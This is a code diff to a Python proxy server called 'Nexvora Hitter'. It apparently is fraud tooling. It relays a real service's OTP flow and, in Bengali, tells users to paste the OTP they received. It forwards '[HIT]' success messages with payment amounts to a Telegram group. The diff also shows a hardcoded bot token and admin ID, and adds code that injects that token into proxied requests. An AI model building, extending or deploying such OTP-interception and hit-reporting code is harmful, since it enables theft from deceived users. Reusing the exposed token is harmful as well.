@@ -25,8 +25,7 @@ APP_NAME = "Nexvora Hitter"
 # Your Telegram Bot Token
 BOT_TOKEN = "8680374467:AAGin7F5co5ax8Y1wb6zdoZvVnUieaqz7x4"
 ADMIN_ID = "8766583877"
-# Rebranded Channels/Groups
-HIT_CHANNEL = "@Nexvora_Official"
+# Rebranded Group
 HIT_GROUP = "@hitterlite"
 
 # SSL context
@@ -159,9 +158,8 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     if 'amount' in data:
                         msg += f"💰 Amount: {data.get('amount')}\n"
                     
-                    # Send to new group and channel
+                    # Send to new group
                     send_telegram_message(HIT_GROUP, msg)
-                    send_telegram_message(HIT_CHANNEL, msg)
                     print(f"  [HIT] Forwarded success message for {user_name}")
             except:
                 pass
@@ -232,6 +230,11 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             # Proxy to real backend to trigger their OTP
             body_dict = self._read_body()
             uid = body_dict.get("userId", "")
+            
+            # ATTEMPT: Pass our BOT_TOKEN to backend in case it supports it
+            body_dict["token"] = BOT_TOKEN
+            body_dict["botToken"] = BOT_TOKEN
+            
             body_json = json.dumps(body_dict).encode()
             
             # Reset current user on new OTP request
@@ -241,7 +244,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self._proxy(method, body=body_json)
             
             if uid:
-                send_telegram_message(uid, f"OTP অফিশিয়াল @HitChkBot থেকে পাঠানো হয়েছে। সেটি কপি করে এখানে দিন।\nসহায়তার জন্য: @autohittrobot")
+                send_telegram_message(uid, f"আপনার ওটিপি (OTP) ওটিপি বোট থেকে পাঠানো হয়েছে। সেটি কপি করে এখানে দিন।\nসহায়তার জন্য: @autohittrobot")
             return
 
         # ---- AUTH: Verify OTP ----
